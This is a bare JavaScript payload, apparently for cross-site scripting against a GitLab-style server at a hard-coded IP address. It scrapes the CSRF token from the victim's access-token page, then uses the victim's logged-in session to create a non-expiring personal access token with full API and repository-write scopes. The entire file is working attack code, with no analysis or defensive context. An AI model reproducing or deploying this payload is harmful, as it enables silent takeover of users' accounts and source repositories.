function get_access(token) {
  fetch("https://65.52.77.188/-/profile/personal_access_tokens", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9,sv-SE;q=0.8,sv;q=0.7",
    "cache-control": "no-cache",
    "content-type": "application/x-www-form-urlencoded",
    "pragma": "no-cache",
    "sec-ch-ua": "\" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"",
    "sec-ch-ua-mobile": "?0",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "https://65.52.77.188/-/profile/personal_access_tokens",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "authenticity_token="+ encodeURI(token) + "&personal_access_token%5Bname%5D=full&personal_access_token%5Bexpires_at%5D=&personal_access_token%5Bscopes%5D%5B%5D=api&personal_access_token%5Bscopes%5D%5B%5D=write_repository",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
}).then(response => response.json())
  .then(data => console.log(data));
}
function get_token() {
  var xhr = new XMLHttpRequest();
  xhr.responseType = "object";
  // true on the end of here makes the call asynchronous
  xhr.open("GET", "/-/profile/personal_access_tokens", true);
  xhr.onload = function () {
    if (xhr.readyState === xhr.DONE) {
      if (xhr.status === 200) {
        //str = xhr.response.split("'X-CSRF-Token': \"").pop();
        str = xhr.response.split("csrf-token\" content=\"").pop();
        token = str.split("\"")[0];
        alert(token);
        get_access(token);
      }
    }
  };
  // Make the request
  xhr.send(null);
}

get_token();
